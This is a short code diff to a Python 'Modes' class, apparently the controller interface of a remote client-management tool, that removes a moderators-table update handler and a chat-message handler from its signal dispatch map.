@@ -19,7 +19,6 @@ class Modes:
             'connectSuccess': self.onViewerConnected,
             'moderatorInitializing': self.moderatorInitializing,
             'getClients': self.getClients,
-            'getModerators': self.getModerators,
             'getNote': self.signal,
             'shellMode': self.signal,
             'explorerMode': self.signal,
@@ -97,19 +96,3 @@ class Modes:
         self.clients.store_clients(data['payload'])
         self.tables.update_clients(data)
         self.moderat.onlineLoading.hide()
-
-    # Administrators Modes
-    def getModerators(self, data):
-        '''
-        Update Moderators Information
-        :param data:
-        :return:
-        '''
-        self.tables.update_moderators(data)
-
-    def chatMode(self, data):
-        '''
-        Chat Handler
-        :return:
-        '''
-        self.moderat.new_message(data)
